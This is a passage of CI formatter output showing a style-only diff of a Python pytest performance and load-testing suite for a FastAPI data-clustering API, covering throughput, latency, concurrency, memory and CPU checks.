-        assert max_time < 50   # No single operation over 50ms
\ No newline at end of file
+        assert max_time < 50  # No single operation over 50ms
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/tests/performance_test.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/tests/performance_test.py	2025-06-10 20:31:25.484857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/tests/performance_test.py	2025-06-10 20:32:36.795532+00:00
@@ -25,33 +25,41 @@
 import pytest
 from fastapi.testclient import TestClient
 
 from . import PERFORMANCE_TEST_CONFIG, SAMPLE_DATA_POINTS
 
+
 @dataclass
 class PerformanceMetrics:
     """Container for performance measurement results."""
+
     operation_name: str
     total_operations: int
     total_duration_seconds: float
     throughput_ops_per_second: float
     latency_percentiles: Dict[str, float] = field(default_factory=dict)
     memory_usage_mb: float = 0.0
     cpu_usage_percent: float = 0.0
     error_count: int = 0
     success_rate: float = 1.0
     timestamps: List[float] = field(default_factory=list)
-    
+
     def __post_init__(self):
         """Calculate derived metrics."""
         if self.total_operations > 0:
-            self.success_rate = (self.total_operations - self.error_count) / self.total_operations
-            self.avg_latency_ms = (self.total_duration_seconds / self.total_operations) * 1000
-
-@dataclass 
+            self.success_rate = (
+                self.total_operations - self.error_count
+            ) / self.total_operations
+            self.avg_latency_ms = (
+                self.total_duration_seconds / self.total_operations
+            ) * 1000
+
+
+@dataclass
 class LoadTestResult:
     """Container for load test results."""
+
     test_name: str
     concurrent_users: int
     duration_seconds: float
     total_requests: int
     successful_requests: int
@@ -62,125 +70,138 @@
     percentile_99_ms: float
     error_rate: float
     memory_peak_mb: float
     cpu_peak_percent: float
 
+
 class PerformanceMonitor:
     """Monitor system resources during performance tests."""
-    
+
     def __init__(self):
         self.monitoring = False
         self.metrics = []
         self.start_time = None
-        
+
     def start_monitoring(self):
         """Start monitoring system resources."""
         self.monitoring = True
         self.start_time = time.time()
         self.metrics = []
-        
+
         def monitor_loop():
             while self.monitoring:
                 timestamp = time.time() - self.start_time
                 cpu_percent = psutil.cpu_percent(interval=0.1)
                 memory = psutil.virtual_memory()
-                
-                self.metrics.append({
-                    'timestamp': timestamp,
-                    'cpu_percent': cpu_percent,
-                    'memory_percent': memory.percent,
-                    'memory_used_mb': memory.used / (1024 * 1024)
-                })
-                
+
+                self.metrics.append(
+                    {
+                        "timestamp": timestamp,
+                        "cpu_percent": cpu_percent,
+                        "memory_percent": memory.percent,
+                        "memory_used_mb": memory.used / (1024 * 1024),
+                    }
+                )
+
                 time.sleep(0.5)  # Sample every 500ms
-        
+
         self.monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
         self.monitor_thread.start()
-        
+
     def stop_monitoring(self):
         """Stop monitoring and return metrics."""
         self.monitoring = False
-        if hasattr(self, 'monitor_thread'):
+        if hasattr(self, "monitor_thread"):
             self.monitor_thread.join(timeout=1)
-        
+
         if not self.metrics:
-            return {'peak_cpu': 0, 'peak_memory_mb': 0, 'avg_cpu': 0, 'avg_memory_mb': 0}
-            
+            return {
+                "peak_cpu": 0,
+                "peak_memory_mb": 0,
+                "avg_cpu": 0,
+                "avg_memory_mb": 0,
+            }
+
         return {
-            'peak_cpu': max(m['cpu_percent'] for m in self.metrics),
-            'peak_memory_mb': max(m['memory_used_mb'] for m in self.metrics),
-            'avg_cpu': statistics.mean(m['cpu_percent'] for m in self.metrics),
-            'avg_memory_mb': statistics.mean(m['memory_used_mb'] for m in self.metrics),
-            'samples': len(self.metrics)
+            "peak_cpu": max(m["cpu_percent"] for m in self.metrics),
+            "peak_memory_mb": max(m["memory_used_mb"] for m in self.metrics),
+            "avg_cpu": statistics.mean(m["cpu_percent"] for m in self.metrics),
+            "avg_memory_mb": statistics.mean(m["memory_used_mb"] for m in self.metrics),
+            "samples": len(self.metrics),
         }
+
 
 class PerformanceTester:
     """Main performance testing class."""
-    
+
     def __init__(self, test_client: TestClient):
         self.client = test_client
         self.monitor = PerformanceMonitor()
-        
-    def measure_operation(self, operation_func, operation_name: str, iterations: int = 100) -> PerformanceMetrics:
+
+    def measure_operation(
+        self, operation_func, operation_name: str, iterations: int = 100
+    ) -> PerformanceMetrics:
         """Measure performance of a single operation."""
         latencies = []
         errors = 0
-        
+
         # Warm up
         for _ in range(5):
             try:
                 operation_func()
             except:
                 pass
-        
+
         # Force garbage collection before measurement
         gc.collect()
-        
+
         self.monitor.start_monitoring()
         start_time = time.time()
-        
+
         for i in range(iterations):
             op_start = time.time()
             try:
                 operation_func()
                 latency = (time.time() - op_start) * 1000  # Convert to ms
                 latencies.append(latency)
             except Exception as e:
                 errors += 1
                 latencies.append(0)  # Record 0 for failed operations
-        
+
         end_time = time.time()
         resource_metrics = self.monitor.stop_monitoring()
-        
+
         total_duration = end_time - start_time
         successful_ops = iterations - errors
-        
+
         # Calculate percentiles
         valid_latencies = [l for l in latencies if l > 0]
         percentiles = {}
         if valid_latencies:
             percentiles = {
-                'p50': statistics.median(valid_latencies),
-                'p90': self._percentile(valid_latencies, 90),
-                'p95': self._percentile(valid_latencies, 95),
-                'p99': self._percentile(valid_latencies, 99),
-                'min': min(valid_latencies),
-                'max': max(valid_latencies)
+                "p50": statistics.median(valid_latencies),
+                "p90": self._percentile(valid_latencies, 90),
+                "p95": self._percentile(valid_latencies, 95),
+                "p99": self._percentile(valid_latencies, 99),
+                "min": min(valid_latencies),
+                "max": max(valid_latencies),
             }
-        
+
         return PerformanceMetrics(
             operation_name=operation_name,
             total_operations=successful_ops,
             total_duration_seconds=total_duration,
-            throughput_ops_per_second=successful_ops / total_duration if total_duration > 0 else 0,
+            throughput_ops_per_second=successful_ops / total_duration
+            if total_duration > 0
+            else 0,
             latency_percentiles=percentiles,
-            memory_usage_mb=resource_metrics['peak_memory_mb'],
-            cpu_usage_percent=resource_metrics['peak_cpu'],
+            memory_usage_mb=resource_metrics["peak_memory_mb"],
+            cpu_usage_percent=resource_metrics["peak_cpu"],
             error_count=errors,
-            timestamps=latencies
-        )
-    
+            timestamps=latencies,
+        )
+
     def _percentile(self, data: List[float], percentile: int) -> float:
         """Calculate percentile of data."""
         if not data:
             return 0.0
         sorted_data = sorted(data)
@@ -189,569 +210,658 @@
             return sorted_data[int(index)]
         else:
             lower = sorted_data[int(index)]
             upper = sorted_data[int(index) + 1]
             return lower + (upper - lower) * (index - int(index))
-    
-    def load_test(self, operation_func, test_name: str, concurrent_users: int, 
-                  duration_seconds: int = 60) -> LoadTestResult:
+
+    def load_test(
+        self,
+        operation_func,
+        test_name: str,
+        concurrent_users: int,
+        duration_seconds: int = 60,
+    ) -> LoadTestResult:
         """Perform load testing with concurrent users."""
         results = {
-            'response_times': [],
-            'errors': 0,
-            'successful_requests': 0,
-            'total_requests': 0
+            "response_times": [],
+            "errors": 0,
+            "successful_requests": 0,
+            "total_requests": 0,
         }
-        
+
         stop_time = time.time() + duration_seconds
         self.monitor.start_monitoring()
-        
+
         def user_simulation(user_id: int):
             """Simulate a single user's behavior."""
-            user_results = {'requests': 0, 'errors': 0, 'response_times': []}
-            
+            user_results = {"requests": 0, "errors": 0, "response_times": []}
+
             while time.time() < stop_time:
                 request_start = time.time()
                 try:
                     operation_func()
                     response_time = (time.time() - request_start) * 1000
-                    user_results['response_times'].append(response_time)
-                    user_results['requests'] += 1
+                    user_results["response_times"].append(response_time)
+                    user_results["requests"] += 1
                 except Exception:
-                    user_results['errors'] += 1
-                
+                    user_results["errors"] += 1
+
                 # Small delay between requests (realistic user behavior)
                 time.sleep(0.1)
-            
+
             return user_results
-        
+
         # Run concurrent users
         with ThreadPoolExecutor(max_workers=concurrent_users) as executor:
             futures = [
-                executor.submit(user_simulation, user_id) 
+                executor.submit(user_simulation, user_id)
                 for user_id in range(concurrent_users)
             ]
-            
+
             # Collect results from all users
             for future in as_completed(futures):
                 user_result = future.result()
-                results['total_requests'] += user_result['requests']
-                results['errors'] += user_result['errors']
-                results['successful_requests'] += user_result['requests']
-                results['response_times'].extend(user_result['response_times'])
-        
+                results["total_requests"] += user_result["requests"]
+                results["errors"] += user_result["errors"]
+                results["successful_requests"] += user_result["requests"]
+                results["response_times"].extend(user_result["response_times"])
+
         resource_metrics = self.monitor.stop_monitoring()
-        
+
         # Calculate metrics
-        total_requests = results['total_requests']
-        successful_requests = results['successful_requests']
-        response_times = results['response_times']
-        
+        total_requests = results["total_requests"]
+        successful_requests = results["successful_requests"]
+        response_times = results["response_times"]
+
         return LoadTestResult(
             test_name=test_name,
             concurrent_users=concurrent_users,
             duration_seconds=duration_seconds,
             total_requests=total_requests,
             successful_requests=successful_requests,
-            failed_requests=results['errors'],
-            throughput_rps=total_requests / duration_seconds if duration_seconds > 0 else 0,
-            avg_response_time_ms=statistics.mean(response_times) if response_times else 0,
+            failed_requests=results["errors"],
+            throughput_rps=total_requests / duration_seconds
+            if duration_seconds > 0
+            else 0,
+            avg_response_time_ms=statistics.mean(response_times)
+            if response_times
+            else 0,
             percentile_95_ms=self._percentile(response_times, 95),
             percentile_99_ms=self._percentile(response_times, 99),
-            error_rate=results['errors'] / total_requests if total_requests > 0 else 0,
-            memory_peak_mb=resource_metrics['peak_memory_mb'],
-            cpu_peak_percent=resource_metrics['peak_cpu']
-        )
+            error_rate=results["errors"] / total_requests if total_requests > 0 else 0,
+            memory_peak_mb=resource_metrics["peak_memory_mb"],
+            cpu_peak_percent=resource_metrics["peak_cpu"],
+        )
+
 
 @pytest.mark.performance
 class TestSingleOperationPerformance:
     """Test performance of individual API operations."""
-    
+
     def test_health_check_performance(self, test_client: TestClient):
         """Test health check endpoint performance."""
         tester = PerformanceTester(test_client)
-        
+
         def health_check():
             response = test_client.get("/health")
             assert response.status_code == 200
-        
-        metrics = tester.measure_operation(health_check, "health_check", iterations=1000)
-        
+
+        metrics = tester.measure_operation(
+            health_check, "health_check", iterations=1000
+        )
+
         # Assert performance requirements
-        assert metrics.throughput_ops_per_second > 500  # Should handle 500+ health checks per second
-        assert metrics.latency_percentiles['p95'] < 100  # 95th percentile under 100ms
+        assert (
+            metrics.throughput_ops_per_second > 500
+        )  # Should handle 500+ health checks per second
+        assert metrics.latency_percentiles["p95"] < 100  # 95th percentile under 100ms
         assert metrics.success_rate > 0.99  # 99%+ success rate
-        
+
         print(f"Health Check Performance:")
         print(f"  Throughput: {metrics.throughput_ops_per_second:.1f} ops/sec")
         print(f"  P95 Latency: {metrics.latency_percentiles['p95']:.1f}ms")
         print(f"  Success Rate: {metrics.success_rate:.3f}")
-    
-    def test_single_point_processing_performance(self, test_client: TestClient, user_headers: Dict):
+
+    def test_single_point_processing_performance(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test single data point processing performance."""
         tester = PerformanceTester(test_client)
-        
+
         def process_point():
             data = {
                 "point_id": f"perf_point_{time.time()}",
                 "features": [1.0, 2.0, 3.0],
-                "session_id": "perf_session_123"
+                "session_id": "perf_session_123",
             }
-            response = test_client.post("/process-point", json=data, headers=user_headers)
+            response = test_client.post(
+                "/process-point", json=data, headers=user_headers
+            )
             assert response.status_code == 200
-        
-        metrics = tester.measure_operation(process_point, "process_point", iterations=500)
-        
+
+        metrics = tester.measure_operation(
+            process_point, "process_point", iterations=500
+        )
+
         # Assert performance requirements
         assert metrics.throughput_ops_per_second > 50  # Target: 50+ points per second
-        assert metrics.latency_percentiles['p95'] < 1000  # 95th percentile under 1 second
+        assert (
+            metrics.latency_percentiles["p95"] < 1000
+        )  # 95th percentile under 1 second
         assert metrics.success_rate > 0.95  # 95%+ success rate
-        
+
         print(f"Single Point Processing Performance:")
         print(f"  Throughput: {metrics.throughput_ops_per_second:.1f} points/sec")
         print(f"  P95 Latency: {metrics.latency_percentiles['p95']:.1f}ms")
         print(f"  Memory Usage: {metrics.memory_usage_mb:.1f}MB")
-    
-    def test_batch_processing_performance(self, test_client: TestClient, user_headers: Dict):
+
+    def test_batch_processing_performance(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test batch processing performance with different sizes."""
         tester = PerformanceTester(test_client)
-        
+
         batch_sizes = [10, 50, 100, 500]
         results = {}
-        
+
         for batch_size in batch_sizes:
+
             def process_batch():
                 data = {
                     "session_id": f"batch_session_{batch_size}",
                     "data_points": [
                         {
                             "id": f"batch_point_{i}",
-                            "features": [i * 0.1, i * 0.2, i * 0.3]
+                            "features": [i * 0.1, i * 0.2, i * 0.3],
                         }
                         for i in range(batch_size)
                     ],
                     "clustering_config": {
                         "similarity_threshold": 0.85,
-                        "min_cluster_size": 3
-                    }
+                        "min_cluster_size": 3,
+                    },
                 }
-                response = test_client.post("/process-batch", json=data, headers=user_headers)
+                response = test_client.post(
+                    "/process-batch", json=data, headers=user_headers
+                )
                 assert response.status_code == 200
-            
+
             metrics = tester.measure_operation(
-                process_batch, 
-                f"batch_processing_{batch_size}", 
-                iterations=20
-            )
-            
+                process_batch, f"batch_processing_{batch_size}", iterations=20
+            )
+
             results[batch_size] = metrics
-            
+
             # Calculate points per second
-            points_per_second = (batch_size * metrics.throughput_ops_per_second)
-            
+            points_per_second = batch_size * metrics.throughput_ops_per_second
+
             print(f"Batch Size {batch_size}:")
-            print(f"  Batch Throughput: {metrics.throughput_ops_per_second:.1f} batches/sec")
+            print(
+                f"  Batch Throughput: {metrics.throughput_ops_per_second:.1f} batches/sec"
+            )
             print(f"  Points Throughput: {points_per_second:.1f} points/sec")
             print(f"  P95 Latency: {metrics.latency_percentiles['p95']:.1f}ms")
-        
+
         # Test that larger batches are more efficient per point
         small_batch_efficiency = results[10].throughput_ops_per_second * 10
         large_batch_efficiency = results[100].throughput_ops_per_second * 100
-        
+
         # Large batches should be at least 2x more efficient per point
         assert large_batch_efficiency > small_batch_efficiency * 2
+
 
 @pytest.mark.performance
 class TestConcurrencyPerformance:
     """Test performance under concurrent load."""
-    
+
     def test_concurrent_health_checks(self, test_client: TestClient):
         """Test health check performance under concurrent load."""
         tester = PerformanceTester(test_client)
-        
+
         def health_check():
             response = test_client.get("/health")
             assert response.status_code == 200
-        
+
         concurrent_users = [1, 5, 10, 20]
-        
+
         for users in concurrent_users:
-            result = tester.load_test(health_check, f"health_concurrent_{users}", users, duration_seconds=30)
-            
+            result = tester.load_test(
+                health_check, f"health_concurrent_{users}", users, duration_seconds=30
+            )
+
             print(f"Concurrent Health Checks ({users} users):")
             print(f"  Throughput: {result.throughput_rps:.1f} req/sec")
             print(f"  Avg Response Time: {result.avg_response_time_ms:.1f}ms")
             print(f"  Error Rate: {result.error_rate:.3f}")
-            
+
             # Assert performance requirements
             assert result.error_rate < 0.01  # Less than 1% error rate
             assert result.avg_response_time_ms < 200  # Average response under 200ms
-    
-    def test_concurrent_data_processing(self, test_client: TestClient, user_headers: Dict):
+
+    def test_concurrent_data_processing(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test data processing under concurrent load."""
         tester = PerformanceTester(test_client)
-        
+
         def process_point():
             data = {
                 "point_id": f"concurrent_point_{threading.current_thread().ident}_{time.time()}",
                 "features": [1.0, 2.0, 3.0],
-                "session_id": f"concurrent_session_{threading.current_thread().ident}"
+                "session_id": f"concurrent_session_{threading.current_thread().ident}",
             }
-            response = test_client.post("/process-point", json=data, headers=user_headers)
+            response = test_client.post(
+                "/process-point", json=data, headers=user_headers
+            )
             return response.status_code == 200
-        
+
         concurrent_users = [1, 5, 10]
-        
+
         for users in concurrent_users:
             result = tester.load_test(
-                process_point, 
-                f"processing_concurrent_{users}", 
-                users, 
-                duration_seconds=60
-            )
-            
+                process_point,
+                f"processing_concurrent_{users}",
+                users,
+                duration_seconds=60,
+            )
+
             print(f"Concurrent Processing ({users} users):")
             print(f"  Throughput: {result.throughput_rps:.1f} req/sec")
             print(f"  P95 Response Time: {result.percentile_95_ms:.1f}ms")
             print(f"  Success Rate: {1 - result.error_rate:.3f}")
             print(f"  Peak Memory: {result.memory_peak_mb:.1f}MB")
-            
+
             # Assert requirements
             assert result.error_rate < 0.05  # Less than 5% error rate
             assert result.percentile_95_ms < 2000  # P95 under 2 seconds
-    
-    def test_mixed_workload_performance(self, test_client: TestClient, user_headers: Dict):
+
+    def test_mixed_workload_performance(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test performance with mixed API operations."""
         tester = PerformanceTester(test_client)
-        
+
         operations = [
             lambda: test_client.get("/health"),
             lambda: test_client.get("/statistics", headers=user_headers),
             lambda: test_client.post(
                 "/process-point",
                 json={
                     "point_id": f"mixed_point_{time.time()}",
                     "features": [1.0, 2.0, 3.0],
-                    "session_id": "mixed_session"
+                    "session_id": "mixed_session",
                 },
-                headers=user_headers
-            )
+                headers=user_headers,
+            ),
         ]
-        
+
         def mixed_operations():
             import random
+
             operation = random.choice(operations)
             response = operation()
             return response.status_code < 500
-        
-        result = tester.load_test(mixed_operations, "mixed_workload", 10, duration_seconds=60)
-        
+
+        result = tester.load_test(
+            mixed_operations, "mixed_workload", 10, duration_seconds=60
+        )
+
         print(f"Mixed Workload Performance:")
         print(f"  Total Requests: {result.total_requests}")
         print(f"  Throughput: {result.throughput_rps:.1f} req/sec")
         print(f"  Error Rate: {result.error_rate:.3f}")
         print(f"  Peak CPU: {result.cpu_peak_percent:.1f}%")
 
+
 @pytest.mark.performance
 @pytest.mark.slow
 class TestStressAndScalabilityTesting:
     """Stress testing and scalability validation."""
-    
+
     def test_memory_stress_test(self, test_client: TestClient, user_headers: Dict):
         """Test system behavior under memory stress."""
         tester = PerformanceTester(test_client)
-        
+
         # Process increasingly large batches to stress memory
         batch_sizes = [100, 500, 1000, 2000]
         memory_usage = []
-        
+
         for batch_size in batch_sizes:
+
             def large_batch_processing():
                 data = {
                     "session_id": f"stress_session_{batch_size}",
                     "data_points": [
                         {
                             "id": f"stress_point_{i}",
-                            "features": [i * 0.001] * 100  # Large feature vectors
+                            "features": [i * 0.001] * 100,  # Large feature vectors
                         }
                         for i in range(batch_size)
                     ],
-                    "clustering_config": {"similarity_threshold": 0.85}
+                    "clustering_config": {"similarity_threshold": 0.85},
                 }
-                response = test_client.post("/process-batch", json=data, headers=user_headers)
+                response = test_client.post(
+                    "/process-batch", json=data, headers=user_headers
+                )
                 return response.status_code == 200
-            
+
             metrics = tester.measure_operation(
-                large_batch_processing, 
-                f"memory_stress_{batch_size}", 
-                iterations=5
-            )
-            
-            memory_usage.append({
-                'batch_size': batch_size,
-                'memory_mb': metrics.memory_usage_mb,
-                'success_rate': metrics.success_rate
-            })
-            
+                large_batch_processing, f"memory_stress_{batch_size}", iterations=5
+            )
+
+            memory_usage.append(
+                {
+                    "batch_size": batch_size,
+                    "memory_mb": metrics.memory_usage_mb,
+                    "success_rate": metrics.success_rate,
+                }
+            )
+
             print(f"Memory Stress Test (batch size {batch_size}):")
             print(f"  Peak Memory: {metrics.memory_usage_mb:.1f}MB")
             print(f"  Success Rate: {metrics.success_rate:.3f}")
-            
+
             # Should handle at least moderate stress
             if batch_size <= 1000:
                 assert metrics.success_rate > 0.8  # 80%+ success for reasonable loads
-        
+
         # Memory usage should grow somewhat linearly with batch size
         # (not exponentially, which would indicate memory leaks)
-        memory_growth = memory_usage[-1]['memory_mb'] / memory_usage[0]['memory_mb']
+        memory_growth = memory_usage[-1]["memory_mb"] / memory_usage[0]["memory_mb"]
         batch_growth = batch_sizes[-1] / batch_sizes[0]
-        
+
         # Memory growth should not be much more than batch size growth
         assert memory_growth < batch_growth * 2  # Allow 2x factor for overhead
-    
+
     def test_throughput_scalability(self, test_client: TestClient, user_headers: Dict):
         """Test throughput scalability with increasing load."""
         tester = PerformanceTester(test_client)
-        
+
         def simple_processing():
             data = {
                 "point_id": f"scale_point_{time.time()}_{threading.current_thread().ident}",
                 "features": [1.0, 2.0, 3.0],
-                "session_id": f"scale_session_{threading.current_thread().ident}"
+                "session_id": f"scale_session_{threading.current_thread().ident}",
             }
-            response = test_client.post("/process-point", json=data, headers=user_headers)
+            response = test_client.post(
+                "/process-point", json=data, headers=user_headers
+            )
             return response.status_code == 200
-        
+
         user_counts = [1, 2, 5, 10, 15, 20]
         throughput_results = []
-        
+
         for users in user_counts:
-            result = tester.load_test(simple_processing, f"scalability_{users}", users, duration_seconds=30)
-            
-            throughput_results.append({
-                'users': users,
-                'throughput': result.throughput_rps,
-                'error_rate': result.error_rate,
-                'avg_response_time': result.avg_response_time_ms
-            })
-            
+            result = tester.load_test(
+                simple_processing, f"scalability_{users}", users, duration_seconds=30
+            )
+
+            throughput_results.append(
+                {
+                    "users": users,
+                    "throughput": result.throughput_rps,
+                    "error_rate": result.error_rate,
+                    "avg_response_time": result.avg_response_time_ms,
+                }
+            )
+
             print(f"Scalability Test ({users} users):")
             print(f"  Throughput: {result.throughput_rps:.1f} req/sec")
             print(f"  Error Rate: {result.error_rate:.3f}")
             print(f"  Avg Response Time: {result.avg_response_time_ms:.1f}ms")
-        
+
         # Test scalability characteristics
-        single_user_throughput = throughput_results[0]['throughput']
-        multi_user_throughput = throughput_results[2]['throughput']  # 5 users
-        
+        single_user_throughput = throughput_results[0]["throughput"]
+        multi_user_throughput = throughput_results[2]["throughput"]  # 5 users
+
         # Should achieve some degree of scalability
         scalability_factor = multi_user_throughput / single_user_throughput
-        assert scalability_factor > 2.0  # Should at least double throughput with 5x users
-        
+        assert (
+            scalability_factor > 2.0
+        )  # Should at least double throughput with 5x users
+
         # Error rate should not increase dramatically with load
-        low_load_errors = throughput_results[1]['error_rate']  # 2 users
-        high_load_errors = throughput_results[-2]['error_rate']  # 15 users
-        
+        low_load_errors = throughput_results[1]["error_rate"]  # 2 users
+        high_load_errors = throughput_results[-2]["error_rate"]  # 15 users
+
         assert high_load_errors - low_load_errors < 0.1  # Error rate increase < 10%
-    
+
     def test_long_duration_stability(self, test_client: TestClient, user_headers: Dict):
         """Test system stability over extended periods."""
         tester = PerformanceTester(test_client)
-        
+
         def continuous_processing():
             data = {
                 "point_id": f"stability_point_{time.time()}",
                 "features": [1.0, 2.0, 3.0],
-                "session_id": "stability_session"
+                "session_id": "stability_session",
             }
-            response = test_client.post("/process-point", json=data, headers=user_headers)
+            response = test_client.post(
+                "/process-point", json=data, headers=user_headers
+            )
             return response.status_code == 200
-        
+
         # Run for 5 minutes with moderate load
-        result = tester.load_test(continuous_processing, "stability_test", 5, duration_seconds=300)
-        
+        result = tester.load_test(
+            continuous_processing, "stability_test", 5, duration_seconds=300
+        )
+
         print(f"Long Duration Stability Test (5 minutes):")
         print(f"  Total Requests: {result.total_requests}")
         print(f"  Average Throughput: {result.throughput_rps:.1f} req/sec")
         print(f"  Final Error Rate: {result.error_rate:.3f}")
         print(f"  Peak Memory: {result.memory_peak_mb:.1f}MB")
-        
+
         # System should remain stable over time
         assert result.error_rate < 0.02  # Less than 2% error rate
         assert result.successful_requests > 1000  # Should process substantial volume
         assert result.memory_peak_mb < 1024  # Should not consume excessive memory
 
+
 @pytest.mark.performance
 class TestPerformanceRegression:
     """Test for performance regressions."""
-    
-    def test_baseline_performance_metrics(self, test_client: TestClient, user_headers: Dict):
+
+    def test_baseline_performance_metrics(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Establish baseline performance metrics for regression testing."""
         tester = PerformanceTester(test_client)
-        
+
         # Define baseline tests
         baseline_tests = [
             {
-                'name': 'health_check',
-                'operation': lambda: test_client.get("/health"),
-                'iterations': 100,
-                'expected_throughput': 200,  # req/sec
-                'expected_p95_latency': 50   # ms
+                "name": "health_check",
+                "operation": lambda: test_client.get("/health"),
+                "iterations": 100,
+                "expected_throughput": 200,  # req/sec
+                "expected_p95_latency": 50,  # ms
             },
             {
-                'name': 'single_point_processing',
-                'operation': lambda: test_client.post(
+                "name": "single_point_processing",
+                "operation": lambda: test_client.post(
                     "/process-point",
                     json={
                         "point_id": f"baseline_{time.time()}",
                         "features": [1.0, 2.0, 3.0],
-                        "session_id": "baseline_session"
+                        "session_id": "baseline_session",
                     },
-                    headers=user_headers
+                    headers=user_headers,
                 ),
-                'iterations': 50,
-                'expected_throughput': 20,   # req/sec
-                'expected_p95_latency': 500  # ms
-            }
+                "iterations": 50,
+                "expected_throughput": 20,  # req/sec
+                "expected_p95_latency": 500,  # ms
+            },
         ]
-        
+
         baseline_results = {}
-        
+
         for test in baseline_tests:
             metrics = tester.measure_operation(
-                test['operation'], 
-                test['name'], 
-                test['iterations']
-            )
-            
-            baseline_results[test['name']] = {
-                'throughput': metrics.throughput_ops_per_second,
-                'p95_latency': metrics.latency_percentiles.get('p95', 0),
-                'success_rate': metrics.success_rate,
-                'memory_usage': metrics.memory_usage_mb
+                test["operation"], test["name"], test["iterations"]
+            )
+
+            baseline_results[test["name"]] = {
+                "throughput": metrics.throughput_ops_per_second,
+                "p95_latency": metrics.latency_percentiles.get("p95", 0),
+                "success_rate": metrics.success_rate,
+                "memory_usage": metrics.memory_usage_mb,
             }
-            
+
             print(f"Baseline {test['name']}:")
             print(f"  Throughput: {metrics.throughput_ops_per_second:.1f} ops/sec")
             print(f"  P95 Latency: {metrics.latency_percentiles.get('p95', 0):.1f}ms")
             print(f"  Memory: {metrics.memory_usage_mb:.1f}MB")
-            
+
             # Assert meets minimum baseline requirements
-            assert metrics.throughput_ops_per_second >= test['expected_throughput'] * 0.8  # 20% tolerance
-            assert metrics.latency_percentiles.get('p95', float('inf')) <= test['expected_p95_latency'] * 1.2
+            assert (
+                metrics.throughput_ops_per_second >= test["expected_throughput"] * 0.8
+            )  # 20% tolerance
+            assert (
+                metrics.latency_percentiles.get("p95", float("inf"))
+                <= test["expected_p95_latency"] * 1.2
+            )
             assert metrics.success_rate >= 0.95
-        
+
         # Store baseline results for future regression testing
         baseline_file = "performance_baseline.json"
         try:
-            with open(baseline_file, 'w') as f:
-                json.dump({
-                    'timestamp': datetime.now().isoformat(),
-                    'version': '1.0.0',
-                    'results': baseline_results
-                }, f, indent=2)
+            with open(baseline_file, "w") as f:
+                json.dump(
+                    {
+                        "timestamp": datetime.now().isoformat(),
+                        "version": "1.0.0",
+                        "results": baseline_results,
+                    },
+                    f,
+                    indent=2,
+                )
         except Exception:
             pass  # Don't fail test if we can't write baseline
+
 
 @pytest.mark.performance
 class TestResourceUtilization:
     """Test resource utilization and efficiency."""
-    
+
     def test_memory_efficiency(self, test_client: TestClient, user_headers: Dict):
         """Test memory usage efficiency."""
         tester = PerformanceTester(test_client)
-        
+
         # Test memory usage with different data sizes
         data_sizes = [10, 100, 1000]
         memory_results = []
-        
+
         for size in data_sizes:
+
             def memory_test():
                 data = {
                     "session_id": f"memory_test_{size}",
                     "data_points": [
                         {
                             "id": f"mem_point_{i}",
-                            "features": [float(i)] * 10  # 10D features
+                            "features": [float(i)] * 10,  # 10D features
                         }
                         for i in range(size)
                     ],
-                    "clustering_config": {"similarity_threshold": 0.85}
+                    "clustering_config": {"similarity_threshold": 0.85},
                 }
-                response = test_client.post("/process-batch", json=data, headers=user_headers)
+                response = test_client.post(
+                    "/process-batch", json=data, headers=user_headers
+                )
                 return response.status_code == 200
-            
-            metrics = tester.measure_operation(memory_test, f"memory_efficiency_{size}", iterations=3)
-            
+
+            metrics = tester.measure_operation(
+                memory_test, f"memory_efficiency_{size}", iterations=3
+            )
+
             memory_per_point = metrics.memory_usage_mb / size if size > 0 else 0
-            memory_results.append({
-                'data_size': size,
-                'total_memory_mb': metrics.memory_usage_mb,
-                'memory_per_point_kb': memory_per_point * 1024
-            })
-            
+            memory_results.append(
+                {
+                    "data_size": size,
+                    "total_memory_mb": metrics.memory_usage_mb,
+                    "memory_per_point_kb": memory_per_point * 1024,
+                }
+            )
+
             print(f"Memory Efficiency (size {size}):")
             print(f"  Total Memory: {metrics.memory_usage_mb:.1f}MB")
             print(f"  Memory per Point: {memory_per_point * 1024:.1f}KB")
-            
+
             # Memory per point should be reasonable
             assert memory_per_point * 1024 < 100  # Less than 100KB per point
-        
+
         # Memory efficiency should not degrade significantly with size
-        small_efficiency = memory_results[0]['memory_per_point_kb']
-        large_efficiency = memory_results[-1]['memory_per_point_kb']
-        
+        small_efficiency = memory_results[0]["memory_per_point_kb"]
+        large_efficiency = memory_results[-1]["memory_per_point_kb"]
+
         # Large batches should be more memory efficient per point
-        assert large_efficiency <= small_efficiency * 2  # Allow some overhead but not excessive
-    
+        assert (
+            large_efficiency <= small_efficiency * 2
+        )  # Allow some overhead but not excessive
+
     def test_cpu_utilization(self, test_client: TestClient, user_headers: Dict):
         """Test CPU utilization patterns."""
         tester = PerformanceTester(test_client)
-        
+
         def cpu_intensive_processing():
             # Process multiple points to create CPU load
             for i in range(10):
                 data = {
                     "point_id": f"cpu_point_{i}_{time.time()}",
                     "features": [float(j) for j in range(50)],  # 50D features
-                    "session_id": "cpu_test_session"
+                    "session_id": "cpu_test_session",
                 }
-                response = test_client.post("/process-point", json=data, headers=user_headers)
+                response = test_client.post(
+                    "/process-point", json=data, headers=user_headers
+                )
                 assert response.status_code == 200
-        
-        metrics = tester.measure_operation(cpu_intensive_processing, "cpu_utilization", iterations=20)
-        
+
+        metrics = tester.measure_operation(
+            cpu_intensive_processing, "cpu_utilization", iterations=20
+        )
+
         print(f"CPU Utilization Test:")
         print(f"  Peak CPU: {metrics.cpu_usage_percent:.1f}%")
         print(f"  Throughput: {metrics.throughput_ops_per_second:.1f} ops/sec")
-        print(f"  CPU Efficiency: {metrics.throughput_ops_per_second / max(metrics.cpu_usage_percent, 1):.2f} ops/sec per CPU%")
-        
+        print(
+            f"  CPU Efficiency: {metrics.throughput_ops_per_second / max(metrics.cpu_usage_percent, 1):.2f} ops/sec per CPU%"
+        )
+
         # CPU usage should be reasonable
         assert metrics.cpu_usage_percent < 95  # Should not max out CPU completely
-        
+
         # Should achieve reasonable CPU efficiency
-        cpu_efficiency = metrics.throughput_ops_per_second / max(metrics.cpu_usage_percent, 1)
-        assert cpu_efficiency > 0.1  # At least 0.1 operations per second per CPU percent
